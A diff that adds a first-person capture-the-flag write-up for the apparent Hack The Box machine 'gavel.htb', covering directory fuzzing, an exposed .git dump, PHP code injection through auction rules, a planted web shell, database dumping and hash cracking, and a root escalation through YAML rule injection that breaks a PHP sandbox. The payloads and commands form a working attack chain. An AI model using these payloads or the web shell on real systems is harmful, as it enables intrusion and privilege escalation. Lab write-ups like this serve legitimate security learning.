@@ -1,0 +1,90 @@
+First I noticed the box uses a virtual host, so I added it to my hosts file with:
+echo "10.129.148.142 gavel.htb" | sudo tee -a /etc/hosts
+
+Then I fuzzed the site using ffuf:
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://gavel.htb/FUZZ
+
+This revealed a few interesting directories: /assets, /rules, and /includes.
+The assets folder had an SB Admin 2 dashboard (so yeah, jQuery and all that). There was also an items.json file listing every item available on the platform.
+Rules and includes just gave 401 errors.
+
+I scanned for PHP files and found index.php, login.php, register.php, admin.php and inventory.php. So the whole site runs on PHP.
+
+I tried brute forcing login and discovered the username "auctioneer", but still didn’t have the password.
+
+While placing a bid, I saw the POST body includes a bid_amount and an auction_id.
+Inside the inventory section, sorting items revealed my user_id was 2. Changing it manually didn’t change anything, so no IDOR here.
+SQLMap on auction_id didn’t give anything either.
+Trying to access admin.php just redirected me back to index.php, so there’s definitely some cookie or role-check happening.
+
+Later I found a .git folder exposed on the web server, so I dumped it:
+git-dumper http://gavel.htb/.git/
+ ./gavel-git
+
+With the source code downloaded, I found a super important section. The app literally takes whatever rule is stored in the database and adds it as PHP code using runkit_function_add:
+
+$rule = $auction["rule"];
+runkit_function_add("ruleCheck", "$current_bid, $previous_bid, $bidder", $rule);
+$allowed = ruleCheck($current_bid, $previous_bid, $bidder);
+
+This means you can straight up inject PHP code into the bidding logic if you control the rule field. Total code execution just by editing a rule.
+
+Inside the admin panel, I added a new rule that writes a shell into the assets folder:
+file_put_contents("../assets/shell.php", "<?php system($_GET['cmd']); ?>"); return true;
+
+Then I placed a bid, the rule executed, and the file was created. I visited:
+/assets/shell.php?cmd=id
+and got execution as www-data.
+
+With that shell I dumped the database:
+mysql -ugavel -pgavel -e "USE gavel; SELECT * FROM users;"
+
+I got the hash of the auctioneer user. I cracked it with hashcat using rockyou:
+hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
+
+The password cracked as: midnight1
+I switched to the auctioneer user and grabbed the user flag.
+
+For root, there’s a daemon that loads YAML files and executes the rule field inside them using restricted PHP. The idea was to break the PHP sandbox so I can execute normal PHP functions.
+
+I created a YAML file that overwrites the php.ini inside the daemon’s config directory with just a single quote. This breaks the config and kills all restrictions:
+
+cat <<EOF > /tmp/root.yaml
+name: x
+price: 1
+description: x
+image: x
+rule_msg: x
+rule: return false;} file_put_contents('/opt/gavel/.config/php/php.ini', "'"); //
+EOF
+
+Then I submitted it:
+gavel-util submit /tmp/root.yaml
+
+After that, the sandbox was basically disabled. To test it, I created another YAML file that writes the result of whoami into /tmp/rootcheck:
+
+cat <<EOF > /tmp/test.yaml
+name: x
+price: 1
+description: x
+image: x
+rule_msg: test
+rule: return false;} system('whoami > /tmp/rootcheck'); //
+EOF
+
+Submitting it and reading the file confirmed it ran as root.
+
+Once that worked, it was easy to read the root flag:
+
+cat <<EOF > /tmp/readflag.yaml
+name: x
+price: 1
+description: x
+image: x
+rule_msg: readflag
+rule: return false;} copy('/root/root.txt', '/opt/gavel/rooted.txt'); //
+EOF
+
+Then:
+gavel-util submit /tmp/readflag.yaml
+cat /opt/gavel/rooted.txt
